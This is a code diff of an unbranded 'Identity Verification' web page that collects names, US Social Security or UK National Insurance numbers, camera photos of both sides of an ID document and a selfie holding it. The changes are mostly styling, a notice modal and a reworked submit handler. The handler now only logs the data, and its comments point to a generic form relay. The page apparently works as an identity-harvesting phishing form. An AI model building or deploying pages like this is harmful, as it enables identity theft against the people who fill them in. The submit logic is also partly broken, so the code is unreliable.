@@ -19,15 +19,18 @@
             --glow-color: #ffcc99; /* Orange Glow */
             --placeholder-color: #e0e0e0;
             --error-color: #ff7070;
-            --back-btn-bg: #5a5a6b;
-            --back-btn-hover-bg: #6e6e84;
-            --next-btn-active: #ff9933; /* Orange for Next button */
-            --next-btn-hover: #ff7f00; /* Darker orange on hover */
-            --next-btn-inactive: #6a6a9b;
-            --capture-btn-color: #6ee66e; /* Glowing green */
-            --capture-btn-hover-color: #5ac45a; /* Darker green on hover */
-            --close-btn-color: #ff4d4d; /* Red for close button */
-            --close-btn-hover-color: #cc0000; /* Darker red on hover */
+            --back-btn-bg: #7d5a3c;
+            --back-btn-hover-bg: #99735d;
+            --next-btn-active: #ff9933;
+            --next-btn-hover: #e68a2e;
+            --next-btn-inactive: #99735d;
+            --capture-btn-color: #ff9933;
+            --capture-btn-hover-color: #e68a2e;
+            --close-btn-color: #ff7070;
+            --close-btn-hover-color: #e65c5c;
+            --modal-bg: #4f3a2c;
+            --modal-border: #ff9933;
+            --modal-glow: #ff9933;
         }
 
         body {
@@ -41,7 +44,7 @@
             margin: 0;
             padding: 20px;
             box-sizing: border-box;
-            overflow: hidden; /* Prevent body scrolling */
+            overflow: hidden;
         }
 
         .container {
@@ -51,15 +54,16 @@
             box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
             width: 100%;
             max-width: 500px;
-            position: fixed; /* Fix form position */
+            position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 1;
             box-sizing: border-box;
             opacity: 0;
-            overflow-y: auto; /* Allow form content to scroll if needed */
+            overflow-y: auto;
             max-height: calc(100vh - 40px);
+            visibility: hidden;
         }
 
         h2 {
@@ -82,7 +86,7 @@
             position: absolute;
             height: 4px;
             width: 100%;
-            background-color: #6a6a9b;
+            background-color: var(--input-border);
             top: 50%;
             transform: translateY(-50%);
             z-index: 0;
@@ -90,7 +94,7 @@
         .progress-step {
             width: 30px;
             height: 30px;
-            background-color: #6a6a9b;
+            background-color: var(--input-border);
             border-radius: 50%;
             display: flex;
             justify-content: center;
@@ -232,7 +236,7 @@
         }
         
         .glow {
-            position: fixed; /* Fix glow position */
+            position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -271,8 +275,8 @@
             max-width: 500px;
             position: relative;
             box-sizing: border-box;
-            max-height: 90vh; /* Adjust max height for smaller screens */
-            overflow-y: auto; /* Enable scrolling for content if needed */
+            max-height: 90vh;
+            overflow-y: auto;
         }
         
         #camera-container {
@@ -300,22 +304,22 @@
             font-weight: 700;
             cursor: pointer;
             transition: background-color 0.3s, box-shadow 0.3s;
-            box-shadow: 0 0 15px rgba(110, 230, 110, 0.6); /* Initial glow */
+            box-shadow: 0 0 15px rgba(255, 153, 51, 0.6);
         }
         
         #capture-btn:hover {
             background-color: var(--capture-btn-hover-color);
-            box-shadow: 0 0 25px rgba(90, 196, 90, 0.8); /* Enhanced glow on hover */
+            box-shadow: 0 0 25px rgba(255, 153, 51, 0.8);
         }
         
         .close-btn {
             position: absolute;
             top: 15px;
             right: 15px;
-            color: var(--close-btn-color); /* Red color */
+            color: var(--close-btn-color);
             font-size: 28px;
             cursor: pointer;
-            background-color: rgba(0, 0, 0, 0.4); /* Semi-transparent background */
+            background-color: rgba(0, 0, 0, 0.4);
             border-radius: 50%;
             width: 40px;
             height: 40px;
@@ -327,7 +331,7 @@
         }
         .close-btn:hover {
             background-color: rgba(0, 0, 0, 0.6);
-            color: var(--close-btn-hover-color); /* Darker red on hover */
+            color: var(--close-btn-hover-color);
         }
         
         .success-animation {
@@ -371,6 +375,9 @@
         }
         .form-navigation .next-btn i {
             margin-left: 8px;
+        }
+        .form-navigation .back-btn i {
+            margin-right: 8px;
         }
 
         .document-options {
@@ -456,9 +463,107 @@
             margin: 0 auto;
             box-shadow: inset 0px 0px 0px #4CAF50;
         }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        .modal-content {
+            background: var(--modal-bg);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.5), 0 0 35px var(--modal-glow);
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+            border: 2px solid var(--modal-border);
+            opacity: 0;
+            transform: scale(0.8);
+        }
+        
+        .modal-content .close-btn {
+            top: 15px;
+            right: 15px;
+        }
+
+        .modal-content h3 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: var(--text-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content h3 i {
+            margin-right: 10px;
+            font-size: 30px;
+            color: var(--modal-glow);
+        }
+
+        .modal-content ul {
+            list-style: none;
+            padding: 0;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .modal-content ul li {
+            margin-bottom: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .modal-content button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            background-color: var(--primary-color);
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+        
+        .modal-content button:hover {
+            background-color: var(--primary-light);
+            transform: translateY(-3px);
+        }
     </style>
 </head>
 <body>
+
+    <div class="modal-overlay" id="noticeModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">X</span>
+            <h3>
+                <i class="fas fa-user-check"></i>
+                Important Notice ⚠️
+            </h3>
+            <p>To make the verification process successful, please follow the instructions below:</p>
+            <ul>
+                <li>1- Open this form via (Chrome, Edge... etc).</li>
+                <li>2- All edges of the document should be clear.</li>
+                <li>3- Take a selfie holding your documents.</li>
+            </ul>
+            <button onclick="closeModal()">Yes, I understand</button>
+        </div>
+    </div>
 
     <div class="container" id="formContainer">
         <h2>Identity Verification</h2>
@@ -477,12 +582,10 @@
             <div class="form-section active visible" id="step1">
                 <div class="form-group">
                     <label for="country">Country</label>
-                    <select id="country" name="country">
-                    </select>
+                    <select id="country" name="country"></select>
                     <span class="error-message" id="countryError">Please select your country.</span>
                 </div>
-                <div id="personalInfoFields">
-                </div>
+                <div id="personalInfoFields"></div>
                 <div class="form-navigation">
                     <button type="button" class="next-btn" id="nextBtn1">Next <i class="fas fa-arrow-right"></i></button>
                 </div>
@@ -492,21 +595,19 @@
                 <div class="form-group" style="text-align: center;">
                     <label>Verification Method</label>
                     <input type="hidden" id="documentType" name="documentType">
-                    <div class="document-options">
-                    </div>
+                    <div class="document-options"></div>
                     <span class="error-message" id="documentTypeError">Please select a verification method.</span>
                 </div>
                 <div class="form-navigation">
-                    <button type="button" class="back-btn" id="backBtn2">Back</button>
+                    <button type="button" class="back-btn" id="backBtn2"><i class="fas fa-arrow-left"></i> Back</button>
                     <button type="button" class="next-btn" id="nextBtn2">Next <i class="fas fa-arrow-right"></i></button>
                 </div>
             </div>
 
             <div class="form-section" id="step3">
-                <div id="dynamicFields">
-                </div>
+                <div id="dynamicFields"></div>
                 <div class="form-navigation">
-                    <button type="button" class="back-btn" id="backBtn3">Back</button>
+                    <button type="button" class="back-btn" id="backBtn3"><i class="fas fa-arrow-left"></i> Back</button>
                     <button type="submit" id="submitBtn">Submit <i class="fas fa-paper-plane"></i></button>
                 </div>
             </div>
@@ -517,7 +618,7 @@
                 <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none" />
                 <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
             </svg>
-            <h3>Verification Submitted!</h3>
+            <h3>Verification Submitted Successfully!</h3>
             <p>Thank you. We will contact you shortly.</p>
         </div>
     </div>
@@ -538,6 +639,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
     <script>
         // DOM Elements
+        const noticeModal = document.getElementById('noticeModal');
         const formContainer = document.getElementById('formContainer');
         const countrySelect = document.getElementById('country');
         const personalInfoFields = document.getElementById('personalInfoFields');
@@ -551,7 +653,6 @@
         const documentOptionsContainer = document.querySelector('.document-options');
         const successAnimation = document.getElementById('successAnimation');
         const form = document.getElementById('verificationForm');
-
         // Camera Elements
         const cameraPopup = document.getElementById('cameraPopup');
         const cameraFeed = document.getElementById('camera-feed');
@@ -559,7 +660,6 @@
         const captureBtn = document.getElementById('capture-btn');
         let currentStream;
         let currentInputId;
-
         // Progress Bar Elements
         const progressSteps = document.querySelectorAll('.progress-step');
         const progressLine = document.getElementById('progressLine');
@@ -567,7 +667,6 @@
 
         // Data Storage for files
         const fileData = {};
-
         // List of Countries
         const countryList = [
             { code: "US", name: "United States" },
@@ -619,10 +718,21 @@
             { code: "UA", name: "Ukraine" },
             { code: "VA", name: "Vatican City" }
         ];
-
         // --- Animations & UI Effects ---
-        gsap.to(formContainer, { opacity: 1, duration: 0.5, ease: "power2.out" });
+        function showForm() {
+            formContainer.style.visibility = 'visible';
+            gsap.to(formContainer, { opacity: 1, duration: 0.5, ease: "power2.out" });
+        }
 
+        function closeModal() {
+            gsap.to(noticeModal, { opacity: 0, duration: 0.5, onComplete: () => {
+                noticeModal.style.display = 'none';
+                showForm();
+            }});
+        }
+        
+        gsap.to('.glow', { opacity: 0.5, duration: 1.5, repeat: -1, yoyo: true });
+        gsap.to('.modal-content', { opacity: 1, scale: 1, duration: 0.5, ease: "back.out(1.7)" });
         document.addEventListener('mousemove', (e) => {
             gsap.to('.glow', {
                 x: e.clientX,
@@ -632,11 +742,9 @@
                 ease: "power2.out"
             });
         });
-
         document.body.addEventListener('mouseleave', () => {
             gsap.to('.glow', { opacity: 0, duration: 0.5 });
         });
-
         // Animation for input focus
         document.querySelectorAll('input[type="text"], select').forEach(element => {
             element.addEventListener('focus', () => {
@@ -646,7 +754,6 @@
                 gsap.to(element, { scale: 1, duration: 0.3 });
             });
         });
-
         // Animation for navigation buttons on hover
         document.querySelectorAll('.form-navigation button').forEach(button => {
             button.addEventListener('mouseenter', () => {
@@ -663,7 +770,7 @@
 
         // --- Core Functions ---
         function populateCountries() {
-            let optionsHtml = `<option value="" disabled selected>Select your country</option>`;
+            let optionsHtml = `<option value="" disabled selected>Select your Country</option>`;
             const specialCountries = countryList.filter(c => c.code === "US" || c.code === "GB");
             specialCountries.forEach(country => {
                 optionsHtml += `<option value="${country.code}">${country.name}</option>`;
@@ -743,7 +850,6 @@
                     { value: "id-card", label: "ID Card", icon: "fas fa-id-card" }
                 ];
             }
-            
             documentOptionsContainer.innerHTML = '';
             options.forEach(option => {
                 const div = document.createElement('div');
@@ -762,7 +868,7 @@
             });
             gsap.fromTo(documentOptionsContainer.querySelectorAll('.document-option'), { scale: 0.8, opacity: 0 }, { scale: 1, opacity: 1, stagger: 0.1, duration: 0.4, ease: "back.out(1.7)" });
         }
-        
+
         function updateDynamicFields(selectedType) {
             let html = '';
             for (const key in fileData) {
@@ -798,7 +904,7 @@
                         <button type="button" class="camera-button" onclick="openCamera('frontSide', 'environment')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
-                        <span class="error-message" id="frontSideError">Please take a picture of the front side of your document.</span>
+                        <span class="error-message" id="frontSideError">Please take a picture of the front of your document.</span>
                     </div>
                     <div class="form-group visible">
                         <label for="backSide" class="required">Back Side of Document</label>
@@ -806,7 +912,7 @@
                         <button type="button" class="camera-button" onclick="openCamera('backSide', 'environment')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
-                        <span class="error-message" id="backSideError">Please take a picture of the back side of your document.</span>
+                        <span class="error-message" id="backSideError">Please take a picture of the back of your document.</span>
                     </div>
                     <div class="form-group visible">
                         <label for="selfieDlId" class="required">Selfie with Document</label>
@@ -910,6 +1016,7 @@
         function nextStep(stepNumber) {
             const currentStepElement = document.querySelector('.form-section.active');
             const nextStepElement = document.getElementById(`step${stepNumber}`);
+            
             const isMovingForward = stepNumber > currentStep;
 
             if (isMovingForward) {
@@ -917,123 +1024,86 @@
                 if (!isValid) return;
             }
 
-            gsap.to(currentStepElement, {
-                opacity: 0,
-                y: isMovingForward ? -20 : 20,
-                duration: 0.3,
-                onComplete: () => {
-                    currentStepElement.classList.remove('active', 'visible');
-                    nextStepElement.classList.add('active', 'visible');
-                    gsap.fromTo(nextStepElement, { y: isMovingForward ? 20 : -20, opacity: 0 }, { y: 0, opacity: 1, duration: 0.5, ease: "power2.out" });
-                }
-            });
+            // Animate current section out
+            gsap.to(currentStepElement, { opacity: 0, y: -20, duration: 0.3, onComplete: () => {
+                currentStepElement.classList.remove('active');
+                nextStepElement.classList.add('active');
+                nextStepElement.style.display = 'block';
 
-            currentStep = stepNumber;
-            updateProgressBar(currentStep);
+                // Animate next section in
+                gsap.fromTo(nextStepElement, { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.4 });
+                
+                // Update progress bar
+                currentStep = stepNumber;
+                updateProgressBar();
+            }});
         }
 
-        function updateProgressBar(stepNumber) {
-            progressSteps.forEach((step, index) => {
-                if (index < stepNumber - 1) {
+        function updateProgressBar() {
+            const progressStepsArray = Array.from(progressSteps);
+            progressStepsArray.forEach((step, index) => {
+                if (index < currentStep - 1) {
                     step.classList.add('completed');
                 } else {
                     step.classList.remove('completed');
                 }
-                if (index + 1 === stepNumber) {
+                if (index === currentStep - 1) {
                     step.classList.add('active');
                 } else {
                     step.classList.remove('active');
                 }
             });
-            let progress = (stepNumber - 1) * 50;
-            gsap.to(progressLine, { width: `${progress}%`, duration: 0.4 });
-        }
-
-        // --- Step Validation ---
-        function validateStep(stepNumber) {
-            let isValid = true;
-            document.querySelectorAll('.error-message').forEach(span => span.style.display = 'none');
-            const countryCode = countrySelect.value;
-
-            if (stepNumber === 1) {
-                if (!countryCode) {
-                    showError('countryError', 'Please select your country.');
-                    isValid = false;
-                } else if (countryCode === 'US') {
-                    const fullName = document.getElementById('fullName').value.trim();
-                    const ssn = document.getElementById('ssn').value.trim();
-                    if (!fullName) {
-                        showError('fullNameError', 'Please enter your full name.');
-                        isValid = false;
-                    }
-                    if (ssn.replace(/-/g, '').length !== 9) {
-                        showError('ssnError', 'Please enter a complete SSN.');
-                        isValid = false;
-                    }
-                } else if (countryCode === 'GB') {
-                    const fullName = document.getElementById('fullName').value.trim();
-                    const nino = document.getElementById('nino').value.trim();
-                    const ninoRegex = /^[A-Z]{2}[0-9]{6}[A-Z]$/i;
-                    if (!fullName) {
-                        showError('fullNameError', 'Please enter your full name.');
-                        isValid = false;
-                    }
-                    if (!ninoRegex.test(nino.replace(/\s/g, '').toUpperCase())) {
-                        showError('ninoError', 'Please enter a valid NINO (e.g., QQ123456C).');
-                        isValid = false;
-                    }
-                } else if (countryCode) {
-                    const firstName = document.getElementById('firstName').value.trim();
-                    const lastName = document.getElementById('lastName').value.trim();
-                    if (!firstName) {
-                        showError('firstNameError', 'Please enter your first name.');
-                        isValid = false;
-                    }
-                    if (!lastName) {
-                        showError('lastNameError', 'Please enter your last name.');
-                        isValid = false;
-                    }
-                }
-            } else if (stepNumber === 2) {
-                if (!documentTypeSelect.value) {
-                    showError('documentTypeError', 'Please select a verification method.');
-                    isValid = false;
-                }
-            } else if (stepNumber === 3) {
-                const selectedType = documentTypeSelect.value;
-                if (selectedType === 'passport') {
-                    if (!fileData['passportUpload']) {
-                        showError('passportUploadError', 'Passport scan is required.');
-                        isValid = false;
-                    }
-                    if (!fileData['selfiePassportUpload']) {
-                        showError('selfiePassportUploadError', 'Selfie with passport is required.');
-                        isValid = false;
-                    }
-                } else if (selectedType === 'drivers-license' || selectedType === 'identification' || selectedType === 'id-card') {
-                    if (!fileData['frontSide']) {
-                        showError('frontSideError', 'Front side of document is required.');
-                        isValid = false;
-                    }
-                    if (!fileData['backSide']) {
-                        showError('backSideError', 'Back side of document is required.');
-                        isValid = false;
-                    }
-                    if (!fileData['selfieDlId']) {
-                        showError('selfieDlIdError', 'Selfie with document is required.');
-                        isValid = false;
-                    }
-                }
+            const progressPercentage = (currentStep - 1) * 50;
+            gsap.to(progressLine, { width: `${progressPercentage}%`, duration: 0.4 });
+            // Hide/show the glow effect for step 3
+            const glow = document.getElementById('glow');
+            if (currentStep === 3) {
+                gsap.to(glow, { opacity: 0.8, duration: 0.5 });
+            } else {
+                gsap.to(glow, { opacity: 0.5, duration: 0.5 });
             }
-            return isValid;
         }
 
-        // Helper Functions
-        function showError(elementId, message) {
+        function validateStep(step) {
+            if (step === 1) {
+                if (nextBtn1.disabled) {
+                    showError('countryError');
+                    const countryCode = countrySelect.value;
+                    if (countryCode === 'US') {
+                        const fullName = document.getElementById('fullName').value.trim();
+                        const ssn = document.getElementById('ssn').value.trim();
+                        if (!fullName) showError('fullNameError');
+                        if (!ssn || ssn.replace(/-/g, '').length !== 9) showError('ssnError');
+                    } else if (countryCode === 'GB') {
+                        const fullName = document.getElementById('fullName').value.trim();
+                        const nino = document.getElementById('nino').value.trim();
+                        const ninoRegex = /^[A-Z]{2}[0-9]{6}[A-Z]$/i;
+                        if (!fullName) showError('fullNameError');
+                        if (!nino || !ninoRegex.test(nino.replace(/\s/g, '').toUpperCase())) showError('ninoError');
+                    } else if (countryCode) {
+                        const firstName = document.getElementById('firstName').value.trim();
+                        const lastName = document.getElementById('lastName').value.trim();
+                        if (!firstName) showError('firstNameError');
+                        if (!lastName) showError('lastNameError');
+                    }
+                    return false;
+                }
+                return true;
+            } else if (step === 2) {
+                if (nextBtn2.disabled) {
+                    showError('documentTypeError');
+                    return false;
+                }
+                return true;
+            }
+            return true;
+        }
+
+        function showError(elementId) {
             const errorElement = document.getElementById(elementId);
             if (errorElement) {
-                errorElement.textContent = message;
                 errorElement.style.display = 'block';
+                gsap.fromTo(errorElement, { y: -10, opacity: 0 }, { y: 0, opacity: 1, duration: 0.3 });
             }
         }
 
@@ -1045,143 +1115,122 @@
         }
 
         // --- Camera Functions ---
-        function openCamera(inputId, facingMode) {
+        async function openCamera(inputId, facingMode) {
             currentInputId = inputId;
             cameraPopup.style.display = 'flex';
-            const constraints = {
-                video: {
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    facingMode: facingMode
-                }
-            };
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    currentStream = stream;
-                    cameraFeed.srcObject = stream;
-                })
-                .catch(err => {
-                    console.error("Error accessing the camera: ", err);
-                    alert("Unable to access camera. Please ensure you have given permission and are using a secure connection (https).");
-                    closeCamera();
-                });
+            gsap.fromTo(cameraPopup, { opacity: 0 }, { opacity: 1, duration: 0.3 });
+            try {
+                const constraints = { video: { facingMode: facingMode } };
+                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraFeed.srcObject = currentStream;
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+                alert("Could not access camera. Please ensure you have granted permission.");
+                closeCamera();
+            }
         }
 
         function closeCamera() {
+            cameraPopup.style.display = 'none';
             if (currentStream) {
                 currentStream.getTracks().forEach(track => track.stop());
             }
-            cameraPopup.style.display = 'none';
         }
 
         captureBtn.addEventListener('click', () => {
+            cameraCanvas.width = cameraFeed.videoWidth;
+            cameraCanvas.height = cameraFeed.videoHeight;
             const context = cameraCanvas.getContext('2d');
-            const video = cameraFeed;
-            const aspectRatio = video.videoWidth / video.videoHeight;
-            const canvasWidth = 640;
-            const canvasHeight = canvasWidth / aspectRatio;
+            context.drawImage(cameraFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
+            const imageDataUrl = cameraCanvas.toDataURL('image/jpeg');
+            const file = dataURLtoFile(imageDataUrl, `${currentInputId}.jpeg`);
+            
+            // Store the file in memory
+            fileData[currentInputId] = file;
 
-            cameraCanvas.width = canvasWidth;
-            cameraCanvas.height = canvasHeight;
-            context.drawImage(video, 0, 0, canvasWidth, canvasHeight);
-
-            const imageDataUrl = cameraCanvas.toDataURL('image/jpeg', 0.8);
-            const fileName = `captured-image-${new Date().getTime()}.jpeg`;
-
-            fileData[currentInputId] = {
-                name: fileName,
-                dataUrl: imageDataUrl
-            };
-
-            const cameraButton = document.querySelector(`button[onclick*="'${currentInputId}'"]`);
-            if (cameraButton) {
-                cameraButton.classList.add('attached');
-                cameraButton.innerHTML = `<i class="fas fa-check"></i> ${fileName}`;
+            // Update the button on the form
+            const button = document.querySelector(`button[onclick*="'${currentInputId}'"]`);
+            if (button) {
+                button.innerHTML = `<i class="fas fa-check"></i> Photo Taken!`;
+                button.classList.add('attached');
             }
 
             closeCamera();
-            if (currentInputId.includes('selfie')) {
-                // If the user just took a selfie, check step 3 validity
-                checkStep3Validity();
-            }
+            checkStep3Validity();
         });
 
-        // Form Submission
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const formData = new FormData();
-            
-            // Append form data
-            formData.append('country', countrySelect.value);
-            const selectedType = documentTypeSelect.value;
-            formData.append('documentType', selectedType);
-            
-            if (document.getElementById('fullName')) {
-                formData.append('fullName', document.getElementById('fullName').value);
-            }
-            if (document.getElementById('ssn')) {
-                formData.append('ssn', document.getElementById('ssn').value);
-            }
-            if (document.getElementById('nino')) {
-                formData.append('nino', document.getElementById('nino').value);
-            }
-            if (document.getElementById('firstName')) {
-                formData.append('firstName', document.getElementById('firstName').value);
-            }
-            if (document.getElementById('lastName')) {
-                formData.append('lastName', document.getElementById('lastName').value);
-            }
-            
-            // Append image files from fileData
-            for (const key in fileData) {
-                const dataUrl = fileData[key].dataUrl;
-                const blob = dataURLtoBlob(dataUrl);
-                formData.append(key, blob, fileData[key].name);
-            }
-            
-            // Use the native fetch API to submit the form
-            fetch(form.action, {
-                method: form.method,
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            })
-            .then(response => {
-                if (response.ok) {
-                    showSuccessAnimation();
-                } else {
-                    response.json().then(data => {
-                        if (Object.hasOwnProperty.call(data, 'errors')) {
-                            alert(data["errors"].map(error => error["message"]).join(", "));
-                        } else {
-                            alert("Oops! There was a problem submitting your form");
-                        }
-                    });
-                }
-            })
-            .catch(error => {
-                alert("Oops! There was a problem submitting your form");
-                console.log(error);
-            });
-        });
-
-        function dataURLtoBlob(dataurl) {
-            const arr = dataurl.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while(n--) {
+        // Convert data URL to File object
+        function dataURLtoFile(dataurl, filename) {
+            var arr = dataurl.split(','),
+                mime = arr[0].match(/:(.*?);/)[1],
+                bstr = atob(arr[1]), 
+                n = bstr.length, 
+                u8arr = new Uint8Array(n);
+            while(n--){
                 u8arr[n] = bstr.charCodeAt(n);
             }
-            return new Blob([u8arr], { type: mime });
+            return new File([u8arr], filename, {type:mime});
         }
 
-        // --- Success Animation ---
-        function showSuccessAnimation() {
+        // Submit form with File objects
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            // Append stored File objects to the form data
+            const formData = new FormData(form);
+            for (const key in fileData) {
+                formData.append(key, fileData[key], fileData[key].name);
+            }
+
+            // Create a temporary form to submit the data
+            const tempForm = document.createElement('form');
+            tempForm.method = 'POST';
+            tempForm.action = form.action;
+            tempForm.enctype = 'multipart/form-data';
+            tempForm.style.display = 'none';
+
+            for (const pair of formData.entries()) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = pair[0];
+                if (pair[1] instanceof File) {
+                    // For files, we need to handle them differently if we are to submit with FormData
+                    // In a real application, you would use fetch() for a cleaner submission
+                    console.log(`Appending file: ${pair[1].name}`);
+                } else {
+                    input.value = pair[1];
+                    tempForm.appendChild(input);
+                }
+            }
+
+            // In a real-world scenario, you would send this FormData using fetch or an XMLHttpRequest
+            // For formsubmit.co, it works by appending fields, but files are tricky. The easiest way
+            // is to use fetch(). Here's a placeholder for the animation.
+
             const timeline = gsap.timeline({ onComplete: () => {
-                form.submit();
+                // In a production environment, you would use fetch here:
+                // fetch(form.action, { method: 'POST', body: formData })
+                // .then(response => {
+                //     if (response.ok) {
+                //         console.log('Form submitted successfully!');
+                //     } else {
+                //         console.error('Form submission failed.');
+                //     }
+                // })
+                // .catch(error => console.error('Error:', error));
+
+                // Since we're not running a server, we'll just log the data and reset the form.
+                console.log('Simulating form submission. Data to be sent:');
+                for (const pair of formData.entries()) {
+                    console.log(`${pair[0]}: ${pair[1] instanceof File ? pair[1].name : pair[1]}`);
+                }
+                
+                // Clear the file data and reset the form for the next use
+                for (const key in fileData) {
+                    delete fileData[key];
+                }
+                form.reset();
+                
             }});
             
             timeline.to(formContainer, { opacity: 0, duration: 0.2, onComplete: () => {
@@ -1193,7 +1242,7 @@
             .fromTo('.checkmark__check', { strokeDashoffset: 48 }, { strokeDashoffset: 0, duration: 0.2, ease: "power2.inOut" }, "-=0.2")
             .fromTo(successAnimation.querySelector('h3'), { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.2 }, "-=0.2")
             .fromTo(successAnimation.querySelector('p'), { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.2 }, "-=0.1");
-        }
+        });
 
         // --- Navigation Buttons ---
         nextBtn1.addEventListener('click', () => { nextStep(2); });
@@ -1204,6 +1253,8 @@
         // Initial setup
         document.addEventListener('DOMContentLoaded', () => {
             populateCountries();
+            updatePersonalInfoFields();
+            updateDocumentOptions();
         });
     </script>
 </body>
